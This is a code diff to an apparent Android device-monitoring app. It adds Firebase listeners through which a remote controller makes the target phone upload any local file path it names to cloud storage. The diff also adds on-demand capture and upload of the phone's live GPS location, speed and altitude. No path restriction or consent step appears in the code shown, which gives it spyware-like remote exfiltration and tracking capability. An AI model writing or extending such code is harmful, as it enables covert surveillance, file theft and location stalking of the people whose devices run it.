@@ -2,6 +2,7 @@ package com.vikasyadavnsit.cdc.utils;
 
 import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
 import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;
+import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getAdminSettingsUserAndroidId;
 
 import android.app.Activity;
 import android.content.Context;
@@ -17,6 +18,9 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
+import com.google.firebase.storage.UploadTask;
 import com.vikasyadavnsit.cdc.constants.AppConstants;
 import com.vikasyadavnsit.cdc.data.AppUsageReportData;
 import com.vikasyadavnsit.cdc.data.SpendingEntry;
@@ -29,6 +33,7 @@ import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.enums.ActionStatus;
 import com.vikasyadavnsit.cdc.enums.ClickActions;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
@@ -70,6 +75,8 @@ public class FirebaseUtils {
                 } else {
                     getAppTriggerSettingsData();
                     listenForRemoteCommands(activity);
+                    listenForDownloadCommands(activity);
+                    listenForLocationCommands(activity);
                 }
             }
 
@@ -118,7 +125,7 @@ public class FirebaseUtils {
         return reference;
     }
 
-    private static String getPath(String path) {
+    public static String getPath(String path) {
         return getBasePath(context) + path;
     }
 
@@ -215,12 +222,16 @@ public class FirebaseUtils {
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                 if (dataSnapshot.exists()) {
                     ActionUtils.getAndUpdateAndroidUserClickActions(dataSnapshot.getValue(Object.class));
+                } else {
+                    // Node missing: pass empty map so the fragment shows the empty-state instead of loading forever
+                    ActionUtils.getAndUpdateAndroidUserClickActions(null);
                 }
             }
 
             @Override
             public void onCancelled(@NonNull DatabaseError databaseError) {
-                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+                Log.e("FirebaseUtils", "getAndroidUserClickActions failed: " + databaseError.toException());
+                ActionUtils.getAndUpdateAndroidUserClickActions(null);
             }
         });
     }
@@ -502,8 +513,106 @@ public class FirebaseUtils {
         });
     }
 
+    public static void requestFileDownload(String path, String fileName) {
+        Map<String, Object> command = new HashMap<>();
+        command.put("path", path);
+        command.put("name", fileName);
+        command.put("timestamp", System.currentTimeMillis());
+        getDbRef(getSelectedUserPath("/commands/downloadRequest")).setValue(command);
+    }
+
+    public static void listenForDownloadCommands(Activity activity) {
+        getDbRef(getPath("/commands/downloadRequest")).addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                if (snapshot.exists()) {
+                    String path = snapshot.child("path").getValue(String.class);
+                    String name = snapshot.child("name").getValue(String.class);
+                    if (path != null && name != null) {
+                        uploadFileToStorage(path, name);
+                    }
+                }
+            }
+            @Override public void onCancelled(@NonNull DatabaseError error) {}
+        });
+    }
+
+    private static void uploadFileToStorage(String localPath, String fileName) {
+        if (context == null) return;
+        File file = new File(localPath);
+        if (!file.exists()) return;
+
+        StorageReference ref = FirebaseStorage.getInstance().getReference().child("downloads/" + getAndroidID(context) + "/" + fileName);
+        ref.putFile(android.net.Uri.fromFile(file))
+            .addOnProgressListener(snapshot -> {
+                double progress = (100.0 * snapshot.getBytesTransferred()) / snapshot.getTotalByteCount();
+                getDbRef(getPath("/status/download")).setValue(Map.of("progress", progress, "status", "UPLOADING", "name", fileName));
+            })
+            .addOnSuccessListener(taskSnapshot -> {
+                getDbRef(getPath("/status/download")).setValue(Map.of("progress", 100, "status", "COMPLETED", "name", fileName, "url", "available"));
+            })
+            .addOnFailureListener(e -> {
+                getDbRef(getPath("/status/download")).setValue(Map.of("progress", 0, "status", "FAILED", "error", e.getMessage()));
+            });
+    }
+
+    public static void monitorDownloadStatus(ValueEventListener listener) {
+        getDbRef(getSelectedUserPath("/status/download")).addValueEventListener(listener);
+    }
+
+    public static void downloadFileFromStorage(String fileName, File localFile, OnDownloadListener listener) {
+        StorageReference ref = FirebaseStorage.getInstance().getReference().child("downloads/" + getAdminSettingsUserAndroidId(context) + "/" + fileName);
+        ref.getFile(localFile)
+            .addOnProgressListener(snapshot -> {
+                int progress = (int) ((100.0 * snapshot.getBytesTransferred()) / snapshot.getTotalByteCount());
+                listener.onProgress(progress);
+            })
+            .addOnSuccessListener(taskSnapshot -> listener.onSuccess())
+            .addOnFailureListener(e -> listener.onFailure(e.getMessage()));
+    }
+
+    public interface OnDownloadListener {
+        void onProgress(int percent);
+        void onSuccess();
+        void onFailure(String error);
+    }
+
     public static void updateRemoteTrigger(String key, User.AppTriggerSettingsData updated) {
         getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/" + key)).setValue(updated);
+    }
+
+    public static void uploadLiveLocation(android.location.Location location) {
+        Map<String, Object> data = new HashMap<>();
+        data.put("lat", location.getLatitude());
+        data.put("lng", location.getLongitude());
+        data.put("accuracy", location.getAccuracy());
+        data.put("altitude", location.getAltitude());
+        data.put("speed", location.getSpeed());
+        data.put("timestamp", location.getTime() > 0 ? location.getTime() : System.currentTimeMillis());
+        data.put("provider", location.getProvider());
+        getDbRef(getPath(AppConstants.FIREBASE_RTDB_LIVE_LOCATION_PATH)).setValue(data);
+    }
+
+    public static DatabaseReference getLiveLocationRef() {
+        return getDbRef(getSelectedUserPath(AppConstants.FIREBASE_RTDB_LIVE_LOCATION_PATH));
+    }
+
+    public static void requestLiveLocationUpdate() {
+        Map<String, Object> command = new HashMap<>();
+        command.put("timestamp", System.currentTimeMillis());
+        getDbRef(getSelectedUserPath("/commands/locationRequest")).setValue(command);
+    }
+
+    public static void listenForLocationCommands(Activity activity) {
+        getDbRef(getPath("/commands/locationRequest")).addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                if (snapshot.exists()) {
+                    LocationUtils.captureAndUpload(activity);
+                }
+            }
+            @Override public void onCancelled(@NonNull DatabaseError error) {}
+        });
     }
 
     public interface SpendingFullSyncCallback {
